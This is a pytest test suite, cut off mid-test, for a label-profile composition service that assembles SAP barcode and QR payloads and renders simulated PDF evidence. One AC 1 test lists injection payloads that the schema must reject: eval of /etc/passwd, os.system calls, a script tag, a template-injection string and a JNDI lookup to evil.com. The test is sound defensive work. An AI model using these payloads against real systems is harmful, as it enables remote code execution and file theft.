"""Test Suite for B2B2L: Versioned Label Profile Composition for Safe Demo.

Verifies all Acceptance Criteria (AC 1 - AC 8):
- AC 1: Schema rejection of extra fields, expressions/eval/code/URLs, invalid field refs, excessive length/segments, unsupported symbology.
- AC 2: N001 development profile synthetic assembly from business_context fact, characteristic, literal, and newline; order is exact; preserves and composes unknown characteristics.
- AC 3: Distinct absent, null, and empty handling on business_context and characteristics, proving block, omit, and marker without fake fact substitution.
- AC 4: Real rendering pipeline to Safe Demo PDF evidence; PyPDF inspection of cover page watermark, item ordering, exact points, vector barcode and QR code.
- AC 5: Fail-closed boundaries: unregistered label_code, missing template slot, disallowed field reference, payload too long, Code128 invalid characters (newlines/non-ASCII), empty payload.
- AC 6: Replay stability with profile version; immutability of historical batches on new profile versions; audit metadata data minimization.
- AC 7: Production activation gate strictly closed (RuntimeError on assert_production_allowed); zero printer socket/spooler calls.
"""

from __future__ import annotations

import asyncio
import copy
import io
import json
from pathlib import Path
import threading
from typing import Any, Dict
from unittest.mock import patch
import uuid

from PIL import Image
import pytest
from pydantic import ValidationError
from pypdf import PdfReader
from fastapi.testclient import TestClient

from engine.barcode_generator import (
    create_barcode_svg_group,
    create_qr_svg_group,
    generate_code128_pattern,
    generate_qr_matrix,
)
from backend.app.services.template_service import TemplateService
from backend.app.main import app
from backend.app.models.profile_composition_v1 import (
    ALLOWED_BUSINESS_CONTEXT_FIELDS,
    EmptyPolicy,
    FieldFormatConfig,
    FieldSegment,
    LabelProfileConfig,
    LiteralSegment,
    ProfileCompositionResult,
    ProfileElementConfig,
)
from backend.app.models.raw_sap_snapshot_v2 import (
    RawBusinessContext,
    RawCharacteristicItem,
    RawSapBatchSnapshotV2,
    RawSapItemSnapshotV2,
)
from backend.app.print_jobs.artifact_storage import DurableFilesystemArtifactStorage
from backend.app.services.n001_rule_adapter import N001DevelopmentAdapter
from backend.app.services.profile_composer import (
    EmptyFieldBlockedError,
    ProfileComposer,
    ProfileCompositionError,
    ProfileImmutabilityError,
    ProfileNotFoundError,
    ProfileRegistry,
    SymbologyMismatchError,
    TemplateSlotMissingError,
    apply_field_formatting,
)
from backend.app.services.sap_shadow_service import (
    SapCanonicalCodes,
    SapCanonicalFields,
    SapCanonicalItemData,
    SapShadowService,
)

TEST_AUTH_TOKEN = "test-sim-auth-token-b2b2l"


@pytest.fixture(autouse=True)
def reset_profile_registry():
    """Ensures each test starts with a clean ProfileRegistry containing only defaults."""
    ProfileRegistry.clear_for_tests()
    yield
    ProfileRegistry.clear_for_tests()


@pytest.fixture
def isolated_service(tmp_path: Path) -> SapShadowService:
    """Provides an isolated SapShadowService instance pointing to temporary disk directories."""
    sim_dir = tmp_path / "sim_store"
    art_dir = tmp_path / "artifacts"
    sim_dir.mkdir(parents=True, exist_ok=True)
    art_dir.mkdir(parents=True, exist_ok=True)
    storage = DurableFilesystemArtifactStorage(art_dir)
    service = SapShadowService(artifact_storage=storage, storage_base_dir=sim_dir)
    service.clear_for_tests()
    return service


def build_valid_n001_raw_item(seq: int = 1, batch_num: str = "B260901", length_val: str = "1500") -> Dict[str, Any]:
    """Helper creating a minimal valid N001 RawSapItemSnapshotV2 dict."""
    return {
        "item_sequence": seq,
        "label_code": "N001",
        "copies": 1,
        "business_context": {
            "material_number": "RM-PET-001",
            "material_description": "Polyethylene Terephthalate Film",
            "batch_number": batch_num,
            "roll_number": f"R-{seq:03d}",
            "sales_order": "SO-100200",
            "sales_order_item": "000010",
            "customer_text": "Safe Demo Pilot Testing",
        },
        "characteristics": [
            {"name": "ZZBRAND", "value": "FLEXIPACK"},
            {"name": "ZZTYPEFILM", "value": "PET-GLOSS"},
            {"name": "ZZBASEFILM", "value": "PET"},
            {"name": "ZZWIDTH", "value": "80"},
            {"name": "ZZLENGTH", "value": length_val},
            {"name": "ZZCONVERSIONROLLKG", "value": "12.5"},
            {"name": "ZZGROSSWEIGHT", "value": "13.2"},
            {"name": "ZZCORE", "value": "3"},
            {"name": "ZZTREATMENT_IN", "value": "CORONA"},
            {"name": "ZZTREATMENT_OUT", "value": "NONE"},
            {"name": "ZZPRODDATE", "value": "2026-09-23"},
            {"name": "ZZUSEDBEFORE", "value": "2027-09-23"},
        ],
    }


def build_valid_raw_batch(items: list[Dict[str, Any]], request_id: str = "REQ-B2B2L-01") -> Dict[str, Any]:
    """Helper creating a valid RawSapBatchSnapshotV2 dict."""
    return {
        "contract_schema_version": "2.0-raw",
        "producer_namespace": "SAP_PPIC",
        "request_id": request_id,
        "printer_id": "PILOT-PRINTER-01",
        "items": items,
    }


# =====================================================================
# AC 1: Schema Rejection of Extra Fields, Expressions, URLs, Symbology
# =====================================================================

def test_ac1_schema_rejects_extra_fields():
    """AC 1: Profile composition models strictly forbid extra attributes (extra='forbid')."""
    with pytest.raises(ValidationError) as exc:
        LiteralSegment(type="literal", value="Prefix: ", extra_unknown="forbidden")
    assert "extra_forbidden" in str(exc.value).lower() or "extra" in str(exc.value).lower()

    with pytest.raises(ValidationError) as exc:
        FieldSegment(
            type="field",
            source="business_context",
            field_name="batch_number",
            injected_field="illegal",
        )
    assert "extra" in str(exc.value).lower()

    with pytest.raises(ValidationError) as exc:
        ProfileElementConfig(
            slot_id="qr_payload",
            output_type="qr",
            symbology="qr",
            segments=[LiteralSegment(value="Test")],
            extra_hack=True,
        )
    assert "extra" in str(exc.value).lower()


def test_ac1_schema_rejects_executable_code_and_expressions():
    """AC 1: Rejects dangerous executable patterns (eval, exec, __import__, script tags, shell)."""
    dangerous_patterns = [
        "eval(open('/etc/passwd').read())",
        "exec('import os')",
        "__import__('os').system('ls')",
        "<script>alert('pwned')</script>",
        "javascript:void(0)",
        "subprocess.Popen(['calc'])",
        "os.system('whoami')",
        "${jndi:ldap://evil.com/x}",
        "{{__init__.__globals__}}",
    ]
    for pattern in dangerous_patterns:
        with pytest.raises(ValidationError) as exc:
            LiteralSegment(type="literal", value=f"Header: {pattern}")
        assert "forbidden" in str(exc.value).lower()


def test_ac1_schema_rejects_network_urls():
    """AC 1: Rejects network URLs (http://, https://, ftp://) in configuration literals."""
    urls = ["http://api.internal/steal", "https://attacker.com/payload", "ftp://storage.lan/data"]
    for url in urls:
        with pytest.raises(ValidationError) as exc:
            LiteralSegment(type="literal", value=f"Visit {url}")
        assert "network urls are forbidden" in str(exc.value).lower()


def test_ac1_schema_rejects_unauthorized_field_references():
    """AC 1: Rejects unauthorized business_context field references and oversized characteristic names."""
    # Unauthorized business_context field
    with pytest.raises(ValidationError) as exc:
        FieldSegment(
            type="field",
            source="business_context",
            field_name="unauthorized_custom_attribute",
        )
    assert "disallowed or unknown business_context field" in str(exc.value).lower()

    # Oversized characteristic name (> 30 characters per SAP standard)
    with pytest.raises(ValidationError) as exc:
        FieldSegment(
            type="field",
            source="characteristics",
            field_name="ZZ_VERY_LONG_NAME_EXCEEDING_THIRTY_CHARACTERS_LIMIT",
        )
    assert "exceeds sap maximum length of 30 characters" in str(exc.value).lower()


def test_ac1_schema_rejects_excessive_configuration():
    """AC 1: Enforces bounds on segments count (<=20), profile elements (<=50), and lengths."""
    # Excessive segments (> 20)
    many_segments = [LiteralSegment(value=f"Seg{i}") for i in range(25)]
    with pytest.raises(ValidationError) as exc:
        ProfileElementConfig(
            slot_id="qr_payload",
            output_type="qr",
            symbology="qr",
            segments=many_segments,
        )
    assert "segments" in str(exc.value).lower()

    # Barcode max_length > 128
    with pytest.raises(ValidationError) as exc:
        ProfileElementConfig(
            slot_id="batch_barcode",
            output_type="barcode",
            symbology="code128",
            max_length=200,  # Max allowed is 128
            segments=[LiteralSegment(value="BC")],
        )
    assert "max_length cannot exceed 128" in str(exc.value).lower()


def test_ac1_schema_rejects_unsupported_symbology():
    """AC 1: Rejects unsupported symbology types and enforces output_type/symbology consistency."""
    # Barcode with unsupported symbology (e.g. code39)
    with pytest.raises(ValidationError) as exc:
        ProfileElementConfig(
            slot_id="batch_barcode",
            output_type="barcode",
            symbology="code39",  # Only code128 allowed
            segments=[LiteralSegment(value="123")],
        )
    assert "input should be 'code128' or 'qr'" in str(exc.value).lower() or "symbology" in str(exc.value).lower()

    # Text element with a symbology
    with pytest.raises(ValidationError) as exc:
        ProfileElementConfig(
            slot_id="batch_text",
            output_type="text",
            symbology="code128",  # Text cannot have symbology
            segments=[LiteralSegment(value="Text")],
        )
    assert "text element" in str(exc.value).lower() and "must not have a symbology" in str(exc.value).lower()


# =====================================================================
# AC 2: N001 Synthetic Assembly & Preserved Unknown Characteristics
# =====================================================================

def test_ac2_n001_synthetic_assembly_exact_order():
    """AC 2: N001 development profile assembles synthetic QR payload and barcode in exact configured order."""
    item_dict = build_valid_n001_raw_item(seq=1, batch_num="0000317326", length_val="1000")
    raw_item = RawSapItemSnapshotV2(**item_dict)

    profile = ProfileRegistry.get("N001", "0.1.0-dev")
    assert profile is not None

    result = ProfileComposer.compose_item(raw_item, profile)

    # 1. Exact synthetic QR payload assembly:
    # "Batch : " + batch_number + "\nPanjang : " + ZZLENGTH + " Meter"
    expected_qr = "Batch : 0000317326\nPanjang : 1000 Meter"
    assert result.codes["qr_payload"] == expected_qr

    # 2. Exact 1D barcode assembly:
    assert result.codes["batch_barcode"] == "0000317326"

    # 3. Deterministic SHA-256 composition hash
    assert result.composition_hash is not None
    assert len(result.composition_hash) == 64


def test_ac2_unknown_characteristic_preserved_and_composed():
    """AC 2: Unknown characteristic preserved by raw snapshot is resolved and composed by a new profile."""
    item_dict = build_valid_n001_raw_item(seq=1)
    # Add an unknown characteristic not in legacy N001 mapping
    item_dict["characteristics"].append({"name": "ZZUNKNOWN_COIL_SPEC", "value": "SPEC-COIL-X99"})
    raw_item = RawSapItemSnapshotV2(**item_dict)

    # Define a test profile referencing the unknown characteristic
    custom_profile = LabelProfileConfig(
        label_code="N001",
        profile_version="0.2.0-dev",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="qr_payload",
                output_type="qr",
                symbology="qr",
                segments=[
                    LiteralSegment(value="COIL_SPEC="),
                    FieldSegment(
                        source="characteristics",
                        field_name="ZZUNKNOWN_COIL_SPEC",
                        on_absent="block",
                    ),
                ],
            ),
            ProfileElementConfig(
                slot_id="batch_barcode",
                output_type="barcode",
                symbology="code128",
                segments=[
                    FieldSegment(source="business_context", field_name="batch_number"),
                ],
            ),
        ],
    )
    ProfileRegistry.register(custom_profile)

    res = ProfileComposer.compose_item(raw_item, custom_profile)
    assert res.codes["qr_payload"] == "COIL_SPEC=SPEC-COIL-X99"


# =====================================================================
# AC 3: Absent, Null, and Empty Handling Without Fact Substitution
# =====================================================================

def test_ac3_absent_null_empty_distinction_business_context():
    """AC 3: Distinguishes absent vs null vs empty on business_context, proving block, omit, and marker."""
    # Case 1: BLOCK policy
    elem_block = ProfileElementConfig(
        slot_id="qr_payload",
        output_type="qr",
        symbology="qr",
        segments=[
            FieldSegment(
                source="business_context",
                field_name="customer_text",
                on_absent="block",
                on_null="block",
                on_empty="block",
            ),
        ],
    )
    prof_block = LabelProfileConfig(
        label_code="TEST_BLOCK",
        profile_version="1.0.0",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[elem_block],
    )

    # 1a. Absent -> EmptyFieldBlockedError
    item_absent = RawSapItemSnapshotV2(
        item_sequence=1,
        label_code="TEST_BLOCK",
        business_context=RawBusinessContext(),  # customer_text is absent
    )
    with pytest.raises(EmptyFieldBlockedError) as exc:
        ProfileComposer.compose_item(item_absent, prof_block)
    assert "is absent" in str(exc.value)

    # 1b. Null -> EmptyFieldBlockedError
    item_null = RawSapItemSnapshotV2(
        item_sequence=1,
        label_code="TEST_BLOCK",
        business_context=RawBusinessContext(customer_text=None),
    )
    with pytest.raises(EmptyFieldBlockedError) as exc:
        ProfileComposer.compose_item(item_null, prof_block)
    assert "is null" in str(exc.value)

    # 1c. Empty string -> EmptyFieldBlockedError
    item_empty = RawSapItemSnapshotV2(
        item_sequence=1,
        label_code="TEST_BLOCK",
        business_context=RawBusinessContext(customer_text="   "),
    )
    with pytest.raises(EmptyFieldBlockedError) as exc:
        ProfileComposer.compose_item(item_empty, prof_block)
    assert "is empty" in str(exc.value)

    # Case 2: Granular OMIT and MARKER policies
    elem_granular = ProfileElementConfig(
        slot_id="qr_payload",
        output_type="qr",
        symbology="qr",
        segments=[
            LiteralSegment(value="PREFIX:"),
            FieldSegment(
                source="business_context",
                field_name="customer_text",
                on_absent="omit",
                on_null="marker",
                on_empty="marker",
                marker_value="[N/A]",
            ),
            LiteralSegment(value=":SUFFIX"),
        ],
    )
    prof_granular = LabelProfileConfig(
        label_code="TEST_GRANULAR",
        profile_version="1.0.0",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[elem_granular],
    )

    # Absent -> omit ("") -> "PREFIX::SUFFIX"
    res_absent = ProfileComposer.compose_item(item_absent, prof_granular)
    assert res_absent.codes["qr_payload"] == "PREFIX::SUFFIX"

    # Null -> marker ("[N/A]") -> "PREFIX:[N/A]:SUFFIX"
    res_null = ProfileComposer.compose_item(item_null, prof_granular)
    assert res_null.codes["qr_payload"] == "PREFIX:[N/A]:SUFFIX"


def test_ac3_absent_null_empty_distinction_characteristics():
    """AC 3: Distinguishes absent vs null vs empty on characteristics, proving block, omit, and marker."""
    elem_char = ProfileElementConfig(
        slot_id="qr_payload",
        output_type="qr",
        symbology="qr",
        segments=[
            LiteralSegment(value="LENGTH="),
            FieldSegment(
                source="characteristics",
                field_name="ZZLENGTH",
                on_absent="omit",
                on_null="marker",
                on_empty="marker",
                marker_value="0",
            ),
        ],
    )
    prof = LabelProfileConfig(
        label_code="TEST_CHAR",
        profile_version="1.0.0",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[elem_char],
    )

    # Characteristic absent -> omit
    item_absent = RawSapItemSnapshotV2(
        item_sequence=1,
        label_code="TEST_CHAR",
        characteristics=[],
    )
    res_absent = ProfileComposer.compose_item(item_absent, prof)
    assert res_absent.codes["qr_payload"] == "LENGTH="

    # Characteristic null -> marker "0"
    item_null = RawSapItemSnapshotV2(
        item_sequence=1,
        label_code="TEST_CHAR",
        characteristics=[RawCharacteristicItem(name="ZZLENGTH", value=None)],
    )
    res_null = ProfileComposer.compose_item(item_null, prof)
    assert res_null.codes["qr_payload"] == "LENGTH=0"

    # Characteristic value present -> "LENGTH=2500"
    item_val = RawSapItemSnapshotV2(
        item_sequence=1,
        label_code="TEST_CHAR",
        characteristics=[RawCharacteristicItem(name="ZZLENGTH", value="2500")],
    )
    res_val = ProfileComposer.compose_item(item_val, prof)
    assert res_val.codes["qr_payload"] == "LENGTH=2500"


def test_ac3_zero_fake_business_fact_substitution():
    """AC 3: Proves zero substitution: absent gross_weight_kg never falls back to net_weight_kg."""
    item_dict = build_valid_n001_raw_item(seq=1)
    # Remove gross weight characteristic and business context
    item_dict["characteristics"] = [c for c in item_dict["characteristics"] if c["name"] != "ZZGROSSWEIGHT"]
    raw_item = RawSapItemSnapshotV2(**item_dict)

    canonical_item, _, audit_meta = N001DevelopmentAdapter.adapt_item(raw_item, compose_profile=True)
    assert canonical_item.fields.gross_weight_kg is None
    # net_weight_kg is present (12.5), but gross_weight_kg is strictly None
    assert canonical_item.fields.net_weight_kg == "12.5"


# =====================================================================
# AC 4: Real Rendering to Safe Demo PDF Evidence
# =====================================================================

def test_ac4_real_rendering_pipeline_to_pdf_evidence(isolated_service: SapShadowService):
    """AC 4: Renders multi-item batch to multi-page Safe Demo PDF evidence with real barcode/QR and watermark."""
    item1 = build_valid_n001_raw_item(seq=1, batch_num="BATCH-P01", length_val="1200")
    item2 = build_valid_n001_raw_item(seq=2, batch_num="BATCH-P02", length_val="1800")
    batch_req = RawSapBatchSnapshotV2(**build_valid_raw_batch([item1, item2], request_id="REQ-E2E-AC4"))

    # Ingest and await processing
    ingest_res = asyncio.run(isolated_service.ingest_raw_batch(batch_req, auto_process=False))
    batch_id = ingest_res["batch_id"]

    asyncio.run(isolated_service.process_batch(batch_id))

    record = isolated_service.get_batch(batch_id)
    assert record is not None
    assert record["status"] == "completed"
    assert record["total_items"] == 2
    assert record["completed_items"] == 2

    # Verify generated PDF evidence bytes
    pdf_bytes = isolated_service.get_evidence_pdf(batch_id)
    assert pdf_bytes.startswith(b"%PDF-")

    reader = PdfReader(io.BytesIO(pdf_bytes))
    # 3 Pages: Page 1 = A4 Cover Manifest, Page 2 = Label Item 1, Page 3 = Label Item 2
    assert len(reader.pages) == 3

    # Page 1: Verify Watermark and Audit Information
    page1_text = reader.pages[0].extract_text()
    assert "SIMULASI — BUKAN UNTUK CETAK FISIK" in page1_text
    assert batch_id in page1_text
    assert "REQ-E2E-AC4" in page1_text
    assert "SAP SHADOW PRINT SIMULATION EVIDENCE" in page1_text

    # Page 2 & 3: Physical Label Dimensions (200mm x 80mm in points = ~566.9 x ~226.7)
    pt_w = (200.0 / 25.4) * 72.0
    pt_h = (80.0 / 25.4) * 72.0
    for page_idx in (1, 2):
        page = reader.pages[page_idx]
        assert abs(float(page.mediabox.width) - pt_w) < 2.0
        assert abs(float(page.mediabox.height) - pt_h) < 2.0


# =====================================================================
# AC 5: Fail-Closed Security & Validation Boundaries
# =====================================================================

def test_ac5_unregistered_label_code_fails_closed(isolated_service: SapShadowService):
    """AC 5: Unregistered label_code fails closed with ValueError without creating a completed PDF."""
    item_dict = build_valid_n001_raw_item(seq=1)
    item_dict["label_code"] = "UNREGISTERED_LABEL_99"
    batch_dict = build_valid_raw_batch([item_dict], request_id="REQ-FAIL-CODE")
    batch_req = RawSapBatchSnapshotV2(**batch_dict)

    with pytest.raises(ValueError) as exc:
        asyncio.run(isolated_service.ingest_raw_batch(batch_req))
    assert "unsupported label_code" in str(exc.value).lower()


def test_ac5_missing_template_slot_fails_closed():
    """AC 5: Profile element declaring a missing slot in SVG template fails closed with TemplateSlotMissingError."""
    bad_profile = LabelProfileConfig(
        label_code="N001",
        profile_version="9.9.9-dev",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="completely_nonexistent_qr_slot",
                output_type="qr",
                symbology="qr",
                segments=[LiteralSegment(value="Test")],
            ),
        ],
    )
    with pytest.raises(TemplateSlotMissingError) as exc:
        ProfileComposer.validate_template_compatibility(bad_profile)
    assert "missing 2d qr slot 'completely_nonexistent_qr_slot'" in str(exc.value).lower()


def test_ac5_payload_too_long_fails_closed():
    """AC 5: Assembled payload exceeding element max_length fails closed."""
    elem = ProfileElementConfig(
        slot_id="batch_barcode",
        output_type="barcode",
        symbology="code128",
        max_length=10,  # Strict short length
        segments=[LiteralSegment(value="123456789012345")],  # 15 characters
    )
    prof = LabelProfileConfig(
        label_code="N001",
        profile_version="1.0.0",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[elem],
    )
    item = RawSapItemSnapshotV2(item_sequence=1, label_code="N001")
    with pytest.raises(ProfileCompositionError) as exc:
        ProfileComposer.compose_item(item, prof)
    assert "exceeds maximum allowed length 10" in str(exc.value).lower()


def test_ac5_code128_invalid_characters_fails_closed():
    """AC 5: Code128 payload containing newlines or non-printable ASCII fails closed with SymbologyMismatchError."""
    elem = ProfileElementConfig(
        slot_id="batch_barcode",
        output_type="barcode",
        symbology="code128",
        max_length=64,
        segments=[LiteralSegment(value="BATCH\nLINE2")],  # Newline is forbidden in 1D barcode
    )
    prof = LabelProfileConfig(
        label_code="N001",
        profile_version="1.0.0",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[elem],
    )
    item = RawSapItemSnapshotV2(item_sequence=1, label_code="N001")
    with pytest.raises(SymbologyMismatchError) as exc:
        ProfileComposer.compose_item(item, prof)
    assert "contains newline or tab" in str(exc.value).lower()


def test_ac5_empty_payload_fails_closed():
    """AC 5: Empty barcode or QR payload fails closed (cannot render blank barcode as valid)."""
    elem = ProfileElementConfig(
        slot_id="batch_barcode",
        output_type="barcode",
        symbology="code128",
        max_length=64,
        segments=[
            FieldSegment(
                source="business_context",
                field_name="customer_text",
                on_absent="omit",  # Omitted -> empty string
            ),
        ],
    )
    prof = LabelProfileConfig(
        label_code="N001",
        profile_version="1.0.0",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[elem],
    )
    item = RawSapItemSnapshotV2(item_sequence=1, label_code="N001")
    with pytest.raises(SymbologyMismatchError) as exc:
        ProfileComposer.compose_item(item, prof)
    assert "cannot be empty" in str(exc.value).lower()


# =====================================================================
# AC 6: Replay Stability, Profile Immutability, Audit Minimization
# =====================================================================

def test_ac6_idempotent_replay_with_profile_version(isolated_service: SapShadowService):
    """AC 6: Replay with same request_id returns existing batch without re-processing."""
    item = build_valid_n001_raw_item(seq=1, batch_num="REPLAY-BATCH-01")
    batch_req = RawSapBatchSnapshotV2(**build_valid_raw_batch([item], request_id="REQ-REPLAY-AC6"))

    res1 = asyncio.run(isolated_service.ingest_raw_batch(batch_req, auto_process=False))
    assert res1["idempotent_replay"] is False
    assert res1["label_code"] == "N001"
    assert res1["profile_version"] == "0.1.0-dev"

    # Second submission with same payload
    res2 = asyncio.run(isolated_service.ingest_raw_batch(batch_req, auto_process=False))
    assert res2["idempotent_replay"] is True
    assert res2["batch_id"] == res1["batch_id"]
    assert res2["profile_version"] == "0.1.0-dev"


def test_ac6_historical_batch_immutable_after_new_profile_registered(isolated_service: SapShadowService):
    """AC 6: Registering a newer profile version does not alter or re-evaluate previously ingested batches."""
    item = build_valid_n001_raw_item(seq=1, batch_num="HIST-BATCH-01")
    batch_req = RawSapBatchSnapshotV2(**build_valid_raw_batch([item], request_id="REQ-HIST-AC6"))

    res1 = asyncio.run(isolated_service.ingest_raw_batch(batch_req, auto_process=False))
    batch_id = res1["batch_id"]
    asyncio.run(isolated_service.process_batch(batch_id))

    record_before = isolated_service.get_batch(batch_id)
    assert record_before["profile_version"] == "0.1.0-dev"
    sha_before = record_before["raw_contract_sha256"]

    # Register newer version 0.2.0-dev with different QR composition
    v2_profile = LabelProfileConfig(
        label_code="N001",
        profile_version="0.2.0-dev",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="qr_payload",
                output_type="qr",
                symbology="qr",
                segments=[LiteralSegment(value="V2-NEW-FORMAT")],
            ),
            ProfileElementConfig(
                slot_id="batch_barcode",
                output_type="barcode",
                symbology="code128",
                segments=[FieldSegment(source="business_context", field_name="batch_number")],
            ),
        ],
    )
    ProfileRegistry.register(v2_profile)

    # Historical batch record is completely untouched
    record_after = isolated_service.get_batch(batch_id)
    assert record_after["profile_version"] == "0.1.0-dev"
    assert record_after["raw_contract_sha256"] == sha_before


def test_ac6_profile_version_immutability():
    """AC 6: Attempting to overwrite an existing profile version with differing config raises ProfileImmutabilityError."""
    dup_profile = LabelProfileConfig(
        label_code="N001",
        profile_version="0.1.0-dev",  # Already registered
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="batch_barcode",
                output_type="barcode",
                symbology="code128",
                segments=[LiteralSegment(value="DIFFERENT")],
            ),
        ],
    )
    with pytest.raises(ProfileImmutabilityError) as exc:
        ProfileRegistry.register(dup_profile)
    assert "profile versions are strictly immutable" in str(exc.value).lower()


def test_ac6_audit_metadata_minimization(isolated_service: SapShadowService):
    """AC 6: Sanitized batch summary displays version and hash without leaking customer_text or raw secrets."""
    secret_customer_text = "CONFIDENTIAL_CLIENT_ORDER_9999"
    item = build_valid_n001_raw_item(seq=1)
    item["business_context"]["customer_text"] = secret_customer_text
    batch_req = RawSapBatchSnapshotV2(**build_valid_raw_batch([item], request_id="REQ-MINIMIZE-AC6"))

    res = asyncio.run(isolated_service.ingest_raw_batch(batch_req, auto_process=False))
    batch_id = res["batch_id"]

    summary = isolated_service.get_batch_summary(batch_id)
    assert summary is not None
    summary_json = json.dumps(summary)

    # Customer confidential text MUST NOT be exposed in sanitized summary
    assert secret_customer_text not in summary_json
    assert summary["label_code"] == "N001"
    assert summary["profile_version"] == "0.1.0-dev"


# =====================================================================
# AC 7: Regressions & Production Activation Gate
# =====================================================================

def test_ac7_production_activation_gate_strictly_closed():
    """AC 7: Production activation gate strictly raises RuntimeError."""
    assert N001DevelopmentAdapter.IS_PRODUCTION_APPROVED is False
    with pytest.raises(RuntimeError) as exc:
        N001DevelopmentAdapter.assert_production_allowed()
    assert "production activation is blocked" in str(exc.value).lower()


def test_ac7_raw_batch_endpoint_requires_simulation_token(isolated_service: SapShadowService):
    """AC 7: POST /api/v1/simulation/raw-batches strictly requires valid X-SAP-Simulation-Token."""
    req_id = f"REQ-AUTH-{uuid.uuid4()}"
    fixture = build_valid_raw_batch([build_valid_n001_raw_item(seq=1)], request_id=req_id)
    with patch("backend.app.api.routes_sap_shadow.is_sap_shadow_simulation_enabled", return_value=True), \
         patch("backend.app.api.routes_sap_shadow.get_sap_simulation_auth_token", return_value=TEST_AUTH_TOKEN), \
         patch("backend.app.api.routes_sap_shadow.sap_shadow_service", isolated_service):
        client = TestClient(app)

        # Missing token -> 401
        res_no_token = client.post("/api/v1/simulation/raw-batches", json=fixture)
        assert res_no_token.status_code == 401

        # Invalid token -> 401
        res_bad_token = client.post(
            "/api/v1/simulation/raw-batches",
            json=fixture,
            headers={"X-SAP-Simulation-Token": "invalid-token"},
        )
        assert res_bad_token.status_code == 401

        # Valid token -> 202 Accepted
        res_valid = client.post(
            "/api/v1/simulation/raw-batches",
            json=fixture,
            headers={"X-SAP-Simulation-Token": TEST_AUTH_TOKEN},
        )
        assert res_valid.status_code == 202
        data = res_valid.json()
        assert data["label_code"] == "N001"
        assert data["profile_version"] == "0.1.0-dev"


# =====================================================================
# Remediation Tests: P1-1, P1-2, P1-3, P1-4, P2-1, P2-2
# =====================================================================

def test_p1_1_provenance_and_audit_fields_rejected_by_schema():
    """P1-1: Schema strictly rejects provenance and audit metadata from being selectable in profile segments."""
    # 1. production_date_provenance is rejected from business_context
    with pytest.raises(ValidationError) as exc:
        FieldSegment(
            source="business_context",
            field_name="production_date_provenance",
        )
    assert "disallowed or unknown business_context field" in str(exc.value).lower() or "forbidden" in str(exc.value).lower()

    # 2. Key containing forbidden security/audit substring 'provenance'
    with pytest.raises(ValidationError) as exc:
        FieldSegment(
            source="characteristics",
            field_name="ZZ_PROVENANCE_SOURCE",
        )
    assert "forbidden security keyword 'provenance'" in str(exc.value).lower()

    # 3. Key containing forbidden substring 'audit'
    with pytest.raises(ValidationError) as exc:
        FieldSegment(
            source="characteristics",
            field_name="ZZ_AUDIT_TRAIL",
        )
    assert "forbidden security keyword 'audit'" in str(exc.value).lower()

    # 4. Key containing forbidden substring 'source_metadata'
    with pytest.raises(ValidationError) as exc:
        FieldSegment(
            source="characteristics",
            field_name="ZZ_SOURCE_METADATA",
        )
    assert "forbidden security keyword 'source_metadata'" in str(exc.value).lower()


def test_p1_2_models_frozen_immutable():
    """P1-2: Profile models are strictly frozen and immutable at the Pydantic level."""
    literal = LiteralSegment(value="Test Literal")
    with pytest.raises(ValidationError):
        literal.value = "Mutated"

    field_seg = FieldSegment(source="business_context", field_name="batch_number")
    with pytest.raises(ValidationError):
        field_seg.field_name = "material_number"

    elem = ProfileElementConfig(
        slot_id="batch_barcode",
        output_type="barcode",
        symbology="code128",
        segments=[field_seg],
    )
    with pytest.raises(ValidationError):
        elem.max_length = 50

    profile = LabelProfileConfig(
        label_code="N001",
        profile_version="1.0.0-test",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[elem],
    )
    with pytest.raises(ValidationError):
        profile.status = "approved"


def test_p1_2_registry_deep_copy_and_mutation_isolation():
    """P1-2: Registry stores deep copies and returns deep copies; mutating returned objects has zero effect."""
    prof = ProfileRegistry.get("N001", "0.1.0-dev")
    assert prof is not None

    # Even if someone attempts to bypass immutability via object.__setattr__ on the returned instance
    first_seg = prof.elements[0].segments[0]
    object.__setattr__(first_seg, "value", "CORRUPTED_PREFIX: ")

    # Fetching from registry again must return clean, unmutated default
    fresh_prof = ProfileRegistry.get("N001", "0.1.0-dev")
    assert fresh_prof is not None
    assert fresh_prof.elements[0].segments[0].value == "Batch : "


def test_p1_2_registry_thread_safety():
    """P1-2: Registry supports thread-safe concurrent read, write, and list operations."""
    errors = []

    def writer(idx: int):
        try:
            p = LabelProfileConfig(
                label_code=f"TH_LBL_{idx}",
                profile_version="1.0.0",
                status="development",
                template_version_id="label_roll_80x200",
                elements=[
                    ProfileElementConfig(
                        slot_id="batch_barcode",
                        output_type="barcode",
                        symbology="code128",
                        segments=[LiteralSegment(value=f"THREAD_{idx}")],
                    )
                ],
            )
            ProfileRegistry.register(p)
        except Exception as exc:
            errors.append(exc)

    def reader(idx: int):
        try:
            _ = ProfileRegistry.get(f"TH_LBL_{idx}", "1.0.0")
            _ = ProfileRegistry.list_profiles()
        except Exception as exc:
            errors.append(exc)

    threads = []
    for i in range(10):
        t1 = threading.Thread(target=writer, args=(i,))
        t2 = threading.Thread(target=reader, args=(i,))
        threads.extend([t1, t2])

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert not errors, f"Thread safety errors occurred: {errors}"


def test_p1_2_isolated_service_clear_does_not_wipe_registry(isolated_service: SapShadowService):
    """P1-2: Calling isolated_service.clear_for_tests() leaves ProfileRegistry decoupled and intact."""
    assert ProfileRegistry.has_profile("N001", "0.1.0-dev")
    isolated_service.clear_for_tests()
    assert ProfileRegistry.has_profile("N001", "0.1.0-dev")


def test_p1_3_n001_composed_text_applied_to_canonical_fields():
    """P1-3: N001 development adapter applies composed text elements directly to SapCanonicalFields."""
    custom_profile = LabelProfileConfig(
        label_code="N001",
        profile_version="0.3.0-dev",
        status="development",
        template_version_id="label_roll_80x200",
        elements=[
            ProfileElementConfig(
                slot_id="batch_text",
                output_type="text",
                segments=[LiteralSegment(value="COMPOSED-TEXT-CUSTOM")],
            ),
            ProfileElementConfig(
